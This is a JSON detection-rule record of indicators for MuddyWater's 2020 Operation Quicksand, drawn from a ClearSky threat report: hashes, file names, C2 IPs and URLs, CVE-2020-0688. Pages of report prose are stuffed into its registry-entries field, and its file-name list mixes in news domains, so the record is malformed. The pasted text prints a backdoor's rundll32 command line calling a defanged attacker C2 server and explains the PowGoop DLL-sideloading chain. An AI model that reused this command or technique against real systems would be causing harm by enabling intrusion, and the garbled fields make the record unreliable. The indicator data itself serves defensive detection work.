{"rule_id": 190, "name": "2020.10.15_Operation_Quicksand_MuddyWater\u2019s_Offensive_Attack_Against_Israeli", "description": "-", "references": ["CVE-2020-0688"], "File_Names": ["GoogleUpdater.exe", "IndexEchangeManagment.aspx", "SSF.exe", "foxnews.com", "webmail.lax", "taskschd.dll", "SSF.MX", "db.vbs", "SSLeay32.dll", "SSF.mx", "pudding.dll", "config.txt", "CLI.dll", "goopdate.dat", "2.vbs", "EXCEL.EXE", "goopdate.pdb", "LiveIdError.aspx", "pdf.exe", "xca_db_stat.exe", "downloadc.php", "nt.aspx", "IndexExchangeManagment.aspx", "Letters.zip", "cli.pdb", "Tria.ge", "GoopDate.dll", "zdnet.com", "1.min", "goopdate86.dll"], "MD5_Hashes": ["5c000ef1e5c6f50cc32c6d70837bd1b2", "2e6169253a87a9d67037b1a238d46365", "dbadc2caee829baf5531703f6741a9d3", "01160fd8afe8f133b7a95755ead39679", "ee2d1e570be5d53a5c970339991e2fd7", "BBE9BB47F8DD8BA97250BF7F13187AB6", "fbe65cd962fc97192d95c40402eee594", "2E7B4AE4BAA704588248B425B8E027BF", "b07d9eca8af870722939fd87e928e603", "2534e46be860170f2237c65749af4435", "2C3D8366B6ED1AA5F1710D88B3ADB77D", "c938b18056ec17ac00bf0083844eafd8", "4d161d67c8cb5c44902b7ebaef131aaf", "1d6f241798818e6fdc03015d01e1e680"], "SHA1_Hashes": [], "SHA256_Hashes": [], "Registry_Entries": ["HKEY_CURRENT_USER\\Software\\Electrum  \n\nHere is a table presenting the new values: \n\n____________________________________________________________________________________________________ \n  www.clearskysec.com \u00a9 All rights reserved to ClearSky Cyber Security ltd. 2020 \n    TLP: WHITE - Subject to standard copyright rules, information may be distributed freely, without restriction  \n14 | P a g e  \n\n \n \n \n \n\fValue Name \n\nDetails \n\nElec \n\nBase64 string that contains data for communication with the C2: \n\n- \n\n- \n\n- \n\n- \n\nIP of the C2 \n\nID \n\nKey \n\nCookie \n\nScan \n\nText string \n\nCovicli Backdoor \n\nFrom the C2, a dll file named SSLeay32.dll will be downloaded. This file is a modified OpenSSL dynamic \n\nlibrary, which was modified for the hacker\u2019s purposes. We identified the following PDB path: \n\nG:\\Project\\Covic\\Modules\\CLI.dll \n\nDue to the appearance of the word Covic, and the original name given to the file (CLI.dll) by the threat \nactor, we named this backdoor Covicli. This file also contains a module version ID of .net4: \n\nCommand and Control \n\nThe attacker uses the following command line in order to communicate with the C2 over OpenSSL: \n\nRundll32.exe C:\\ProgramData\\RozellaBobine\\ssleay32.dll, DllRegisterServer \nhxxp://185.183.96[.]61:80/downloadc.php?key=WKXKgRkJsT \n\nThis server\u2019s Header displays the server\u2019s location as if it is associated with the Azerbaijani government. \n\nThe result of this is diverging access to the server through port 80 but without the path to the following \n\nsite: \n\n____________________________________________________________________________________________________ \n  www.clearskysec.com \u00a9 All rights reserved to ClearSky Cyber Security ltd. 2020 \n    TLP: WHITE - Subject to standard copyright rules, information may be distributed freely, without restriction  \n15 | P a g e  \n\n \n \n \n \n \n\fThe  malware  itself  generates  a  scheduled  task  named  Updater  (expanded  further  on)  that \ncommunicates with the server using PowerShell (on port 80), much like MoriAgent. The PowerShell will \nrun the following commands: ipconfic, arp, net.  \n\n____________________________________________________________________________________________________ \n  www.clearskysec.com \u00a9 All rights reserved to ClearSky Cyber Security ltd. 2020 \n    TLP: WHITE - Subject to standard copyright rules, information may be distributed freely, without restriction  \n16 | P a g e  \n\n \n \n \n \n \n\fActions on Objectives \n\nPowGoop Loader \n\nIf the connection to the C2 was successful, the PowGoop loader will be installed in the system. After \nthe  installation,  the  attacker  tried  to  delete  SSF.mx  task  from  the  network  by  using  the  following \n\ncommand: \n\nIn our research, we found five components of PowGoop array:    \n\n\u2022  GoogleUpdate.exe - Legitimate signed binary  \n\n\u2022  goopdate86.dll - Legitimate DLL, vulnerable to a DLL sideloading attack.  \n\n\u2022  goopdate.dll - First loader of PowGoop.  \n\n\u2022  goopdate.dat  -  Second  loader  of  PowGoop.  Obfuscated  on  disk.  Decodes  PowerShell \n\ndownloader component  \n\n\u2022  config.txt - Encoded PowerShell downloader  \n\n This is a slightly different variant originally found in the report by Palo Alto (which reported about 4 \n\ncomponents).  The  loader  from  PaloAlto  report  was  split  into  two  components.  The  second  loader \n\nfound in this attack matches the functionality of the only loader described in Palo Alto\u2019s report. This \n\nsuggests it was used as a technique by the attacker to obfuscate part of the loader that was detected \n\nby antivirus scanners.  \n\n The  GoogleUpdate.exe  used  with  the  malware  is  a  legitimate  binary,  but  it  is  vulnerable  to  a  DLL-\nsideloading attack. One of Google Update\u2019s dependencies is a DLL named goopdate86.dll which then \n\nhas  a  dependency  of  goopdate.dll.  The  malware  works  by  replacing  the  original  goopdate.dll  by  a \n\nmalicious DLL containing the same filename. By replacing the legitimate goopdate.dll with a malicious \n\none, GoogleUpdater.exe ends up loading the malicious payload into memory.  \n\nThe PowGoop malware works as follows:  \n\n\u2022  GoogleUpdate.exe (legitimate binary) loads legitimate goopdate86.dll into memory.  \n\n\u2022  goopdate86.dll loads the malicious goopdate.dll into memory (side-loading).  \n\n\u2022  Malicious goopdate.dll launches rundll32.exe with the parameter DllRegisterServer.  \n\n\u2022  The  export  DllRegisterServer  from  the  malicious  goopdate.dll  gets  run,  which  loads  the \n\nsecond, obfuscated loader goopdate.dat, into memory.  \n\n\u2022  The  script  embedded  in  the  second  loader  then  decodes  config.txt,  revealing  another \n\nPowerShell script once decoded, and then executing the now decoded script.  \n\n\u2022  The  encoded  script  then  connects  to  an  C2  and  acts  as  a  downloader  waiting  for  new \n\npayloads.  \n\n____________________________________________________________________________________________________ \n  www.clearskysec.com \u00a9 All rights reserved to ClearSky Cyber Security ltd. 2020 \n    TLP: WHITE - Subject to standard copyright rules, information may be distributed freely, without restriction  \n17 | P a g e  \n\n \n \n \n \n\fFollowing a screenshot from our investigation, presents the execution of PowGoop in the machine, and \nthe PowerShell script that was extracted from22.  \n\nUnlike the .dat file in PaloAlto report, in this case the loader used goopdate.dat file: \n\nNote that this file shares the same PDB path with the Covicli backdoor: \n\nG:\\Project\\Covic\\Modules\\goopdate.pdb \n\nIn  both  cases,  the  PowGoop  loader  payload  was  downloaded  from  the  C2  (which  we  attributed  to \n\nMuddyWater  based  on  unique  server  signature).  Once  this  payload  is  run  successfully,  a  Thanos \n\nRansomware  payload  can  be  downloaded  to  the  server,  which  is  compatible  with  the  scenario \n\nPaloAlto described in their report.  \n\n22 The photo was based on the service Tria.ge \n\n____________________________________________________________________________________________________ \n  www.clearskysec.com \u00a9 All rights reserved to ClearSky Cyber Security ltd. 2020 \n    TLP: WHITE - Subject to standard copyright rules, information may be distributed freely, without restriction  \n18 | P a g e  \n\n \n \n \n \n \n \n \n \n \n\fAttribution  \n\n\u201cMuddyWater\u201d group is one of the most active Iranian APTs, targeting Israeli organizations since at least \n2018. Over the past few years, we have uncovered a number of \u201csocial engineering\u201d attack scenarios \nconducted by the group. campaigns by the group have targeted individuals, companies, organizations, \nand governments. We also identified attacks by the group targeting internal Iranian actors. \n\nThe group\u2019s campaigns may be categorized to three distinct periods and attack scenarios (ordered \nchronologically):  \n\n1. \n\nInitial Wave of Attacks \u2013 \u201cPowerStats\u201d era \u2013 this attack TTP was using Office documents as \nan entry vector, Word documents at first, then transferring to Excel  files two years later. \n\nThese  documents  were  used  to  activate  malicious  macros  that  communicate  with  a \nhacked C2, download PowerShell codes, connect to an additional server, and finally to \ninstall  the  PowerStats \n  RAT.  \u201cPowerStats\u201d  named  after  another  group\u2019s  moniker \n\u201cStaticKitten\u201d. \n\n2. \n\nSecond  Wave  \u2013  DNS  Tunneling  -  During  this  period,  the  group  used  the  same  Office \n\ndocuments,  only  instead  of  connecting  to  a  hacked  server  the  group  performed  DNS \n\nqueries  to  self-owned  servers.  The  main  tool  utilized  by  the  group  is  a  DLL  named \n\nForeLord,  constituting  a  RAT.  Some  of  the  domains  addressed  by  the  group  were \n\nregistered  such  that  they  impersonate  security  companies,  for  example  Trend  Micro, \n\nKaspersky, and ClearSky itself. \n\n3. \n\nThird Wave \u2013 PudPoul/MoriAgent \u2013 during the past few months we have located a new \n\nattack campaign by the group, characterized by generating executables that unload two \n\nmain files to the machine: a legitimate PDF and a malicious DLL named MoriAgent. As the \n\ninvestigation continued a MoriAgent variant was uncovered, named PudPoul after the file \n\npudding.dll. This attack scenario is the most recent and up to date regarding the group. It \n\nis worth noting that throughout this campaign we have only identified the installation of \n\nthe tool on the target network, but no direct application of said tool towards any specific \n\naim. This differs from the PowerStats and DNS tunneling periods, and as such prevents \n\nClearSky from determining the absolute purpose of the campaign (intelligence gathering, \ndestruction, or a combination of both in the form of an intelligence gathering campaign \n\nturned destructive). A Palo Alto research regarding a destructive (wiper) malware named \n\nThanos  that  impersonates  a  ransomware  during  activation  was  published  last  week. \n\nClearSky identified many congruences with the PudPoul files, leading to a MuddyWater \n\nassociation. \n\nStill, ClearSky holds several reservations regarding the association, which should be duly considered: \n\n\u2022  The group has acted towards intelligence gathering and espionage for the Iranian regime so \n\nfar, in place of destructive attacks. \n\n____________________________________________________________________________________________________ \n  www.clearskysec.com \u00a9 All rights reserved to ClearSky Cyber Security ltd. 2020 \n    TLP: WHITE - Subject to standard copyright rules, information may be distributed freely, without restriction  \n19 | P a g e  \n\n \n \n \n\f\u2022  The group continues to employ attack scenarios based on social engineering. \n\n\u2022  The Iranian APT33 does conduct destructive attacks but has yet to be linked with MuddyWater. \n\nIt is possible that due to the advancing confrontation with Israel, and simply developments of attack \nmethods over time, that the group had undergone an organizational\\strategic evolution (or simply \n\nreceived new instructions) into destructive attacks. During ClearSky\u2019s investigation we have located \nseveral additional files and C2s that operate as part of the attack infrastructure.  \n\nOnce  the  tool  is  deployed,  keys  are  exchanged,  and persistence  on  the  network  is  established,  the \ngroup generates communications with its C2, this apparently to install a malware that appears to be \nransomware.  In  light  of  the  exposure  of  Thanos,  ClearSky  assesses  that  the  group  is  attempting  to \nemploy destructive attacks (the likes of the NotPetya attack from 2017).  \n\n____________________________________________________________________________________________________ \n  www.clearskysec.com \u00a9 All rights reserved to ClearSky Cyber Security ltd. 2020 \n    TLP: WHITE - Subject to standard copyright rules, information may be distributed freely, without restriction  \n20 | P a g e  \n\n \n \n \n \n \n\fSummary and Insights \n\nMuddyWater updated their TTPs, as well as their level of sophistication, mainly during 2020. We assess \nthat during this year MuddyWater began to work for the IRGC , acting as a contractor for additional \ncyber security operations. Since the group was discovered a few years ago, their priority was only CNE \n(espionage), against private organizations, government organizations, ministries, and agencies.  \n\nThe group relied mostly on social engineering methods. For example, in late 2019 we discovered an \nattempt to attack a journalist that worked for a prominent US media outlet. In the first stage of the \nattack, MuddyWater emailed the victim without sending any file or link. The group tried to schedule a \nphysical meeting with the victim, and only after he made it clear that he cannot have the meeting, the \n\ngroup sent him a malicious file. Unlike this past TTP, we identified exploitation of vulnerabilities as the \n\nmajor injection vector in the current campaign.  \n\nWe assess that the level of sophistication inherent to the group is high. Israel and other countries that \nare under the threat of this group have to harden their network and be prepared for more camouflaged \ndestructive  campaigns.  This  time,  the  attack  was  prevented,  and  therefore  we  cannot  prove  that \nMuddyWater installed PowGoop in the victim\u2019s network for a destructive attack. However, we adopted \n\nthe assessment by PaloAlto regarding the purpose of this loader.  \n\nMuddyWater\u2019s capabilities are not extremely unique, and this attack seems like an escalation of their \n\naggression level,  rather than a  completely new form of  attack (as was the case in the  reported Fox \n\nKitten attack). However, it is noteworthy that in this attack the previous infiltration into the systems of \nthe Israeli organizations was used as to gain trust and thus provide a basis for further attacks.  \n\nThe tension between Israel and Iran in the cyber domain might be an explanation for this evolution. \n\nThis tension began a decade ago, with the Stuxnet malware that was attributed to Israel and the US, \n\nand  the  Iranian  response.  One  of  the  retaliations  of  this  attack  was  the  mentioned  destructive \n\nShamoon attack which was attributed to another Iranian threat actor \u2013 APT33. This year displayed a \nnew phase of this tension, beginning with the uncovering of the Fox Kitten operation23 and the alleged \nattack by Iran against the water authority of Israel.  \n\nThe  retaliation  for  Ghasem  Soleimani\u2019s  death  is  another  possible  explanation  for  the  attack.  The \n\nassassination caught Iran off-guard. On the same day, the wiper \u2018Dustman\u2019 was exposed. We assess \nthat another potential explanation for Operation Quicksand is retaliation for the assassination, and the \n\ntiming was dependent on the toolset the Iranian threat actor possessed at the time.  \n\n23 https://www.clearskysec.com/fox-kitten/ \n\n____________________________________________________________________________________________________ \n  www.clearskysec.com \u00a9 All rights reserved to ClearSky Cyber Security ltd. 2020 \n    TLP: WHITE - Subject to standard copyright rules, information may be distributed freely, without restriction  \n21 | P a g e  \n\n \n \n \n \n \n \n \n\fIndicators of Compromise \n\nHashes \n\nHash \n\nFile Name \n\nVT Relevant \n\nType \n\nSubmitter \n\nb07d9eca8af870722939fd87e928e603 \n\nSSF.exe \n\nVector A \n\nee2d1e570be5d53a5c970339991e2fd7 \n\nAutodiscoverExchangeManagme\nnt.aspx \n\nVector B \n\nUS \n\nSSF.mx \nbackdoor \n\nUAE \n\nWebShell \n\n01160fd8afe8f133b7a95755ead39679 \n\n \u05d4\u05d0\u05d5\u05d5\u05dc\u05d4\u05dc \u05d9\u05e0\u05d5\u05e8\u05e7\u05e2 \u05e8\u05d5\u05e9\u05d9\u05d0 \n\nUS \n\ndbadc2caee829baf5531703f6741a9d3 \n\n \u05d4\u05d0\u05d5\u05d5\u05dc\u05d4\u05dc \u05d9\u05e0\u05d5\u05e8\u05e7\u05e2 \u05e8\u05d5\u05e9\u05d9\u05d0 \n\n2534e46be860170f2237c65749af4435 \n\nConfidential-Letters.zip \n\n2e6169253a87a9d67037b1a238d46365 \n\nConfidential Letters(Names).xls \n\n4a898c1a27385e7efd0a5eda8fb15ce81cbe2258b0\nf44a238a1f6a77fe169099 \n\naa927a2e427f203c15c71678966890c8f55403a7c9\n7bd6db9f531ed43e47bb18 \n\n- \n\nf8bb7f04b367a2e261e2bde3eefd66ad858493f37d\n0c11c904341b52748f8a43 \n\nc938b18056ec17ac00bf0083844eafd8 \n\n[Untitled].pdf.exe \n\n2C3D8366B6ED1AA5F1710D88B3ADB77D \n\n2E7B4AE4BAA704588248B425B8E027BF \n\nBBE9BB47F8DD8BA97250BF7F13187AB6 \n\n5c000ef1e5c6f50cc32c6d70837bd1b2 \n\ndl.ps1 \n\nPutty.ps1 \n\n2.vbs \n\ndb.vbs \n\nfbe65cd962fc97192d95c40402eee594 \n\nCLI.dll / ssleay32.dll \n\n4d161d67c8cb5c44902b7ebaef131aaf \n\nxca_db_stat.exe \n\n1d6f241798818e6fdc03015d01e1e680 \n\nGoopdate.dll \n\nPowGoop \n\nIL \n\nIL \n\nIL \n\n- \n\n- \n\nIL \n\n- \n\n- \n\nIL \n\n- \n\n- \n\n- \n\nZIP for PDF \ndecoy \n\nPDF decoy \n\nZip for Excel \ndecoy \n\nExcel Decoy \n\nPersistency \nPDF \n\nPowerShell \n\nPowerShell \n\nVBS code \n\nVBS code \n\nCovicli \nbackdoor \n\nLegitimate file \n\nPowGoop \n\n____________________________________________________________________________________________________ \n  www.clearskysec.com \u00a9 All rights reserved to ClearSky Cyber Security ltd. 2020 \n    TLP: WHITE - Subject to standard copyright rules, information may be distributed freely, without restriction  \n22 | P a g e  \n\n \n \n \n \n \n \n\fURLs and C2 Addresses \n\nThe  following  IP  addresses  were  successfully  accessed  by  the  attack  group  to  be  used  as  C2  of \nOperation Quicksand: \n\nURL \n\nIP  \n\nASN \n\nNon-Malicious \n\nhxxps://webhook[.]site/7c1564f7-4e3c-4082-b1f8-3b52da3d9941   \n\nhxxps://webhook[.]site/861f0c6f-238a-4878-8e44-0ca078ad9b2c   \n\n46.4.105[.]116 \n\nHetzner Online GmbH \n\nhxxps://webhook[.]site/f4c2dba3-bdba-44a3-b8b8-f292b6fb8a7b \n\nhxxps://webmail.lax.co[.]il/owa/auth/Current/Script/jquery-3.5.1.min.js \n\n212.143.154[.]158 \n\nCellcom Fixed Line \nCommunication L.P. \n\nhxxps://ws.onehub[.]com/files/gxvrqwzu \n\n- \n\n- \n\nMalicious \n\nhxxp://185.183.96[.]61:80/downloadc.php?key= \n\nHxxp://185.183.98[.]242/default.php \n\n- \n\n185.183.96[.]61 \n\n185.183.98[.]242 \n\n185.82.202[.]70 \n\n185.244.149[.]215 \n\nHost Sailor LTD \n\n185.183.96[.]28 \n\n185.117.75[.]101 \n\n185.82.202[.]66 \n\n____________________________________________________________________________________________________ \n  www.clearskysec.com \u00a9 All rights reserved to ClearSky Cyber Security ltd. 2020 \n    TLP: WHITE - Subject to standard copyright rules, information may be distributed freely, without restriction  \n23 | P a g e  \n\n \n \n \n \n \n \n \n\fClearSky Cyber Security Intelligence Report \n\n2020 (C)All rights reserved to ClearSky Security Ltd. \n\nTLP: WHITE - Subject to standard copyright rules, information may be distributed freely, without restriction. \n\n____________________________________________________________________________________________________ \n  www.clearskysec.com \u00a9 All rights reserved to ClearSky Cyber Security ltd. 2020 \n    TLP: WHITE - Subject to standard copyright rules, information may be distributed freely, without restriction  \n24 | P a g e  \n\n \n \n \n \n \n\f"], "URLs": ["https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-0688", "https://github.com/securesocketfunneling/ssf", "https://www.recordedfuture.com/thanos-ransomware-builder/", "https://www.mcafee.com/blogs/other-blogs/mcafee-labs/shamoon-attackers-employ-new-tool-kit-to-wipe-infected-systems/", "https://www.ibm.com/downloads/cas/OAJ4VZNJ", "https://github.com/mahyarx/Exploit_CVE-2020-0688", "https://www.wired.com/story/notpetya-cyberattack-ukraine-russia-code-crashed-the-world/", "https://www.foxnews.com/world/iran-picks-cyber-fight-with-israel-as-both-sides-target-critical-infrastructure", "https://www.bbc.com/news/technology-19293797", "https://unit42.paloaltonetworks.com/thanos-ransomware/", "https://www.zdnet.com/article/new-iranian-data-wiper-malware-hits-bapco-bahrains-national-oil-company/", "https://www.clearskysec.com/fox-kitten/", "https://www.zdnet.com/article/microsoft-says-iranian-hackers-are-exploiting-the-zerologon-vulnerability/", "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-1472", "https://www.secureworks.com/blog/business-as-usual-for-iranian-operations-despite-increased-tensions", "https://www.fireeye.com/blog/threat-research/2017/09/apt33-insights-into-iranian-cyber-espionage.html", "https://unit42.paloaltonetworks.com/unit42-shamoon-2-return-disttrack-wiper/"], "weight": 0.0}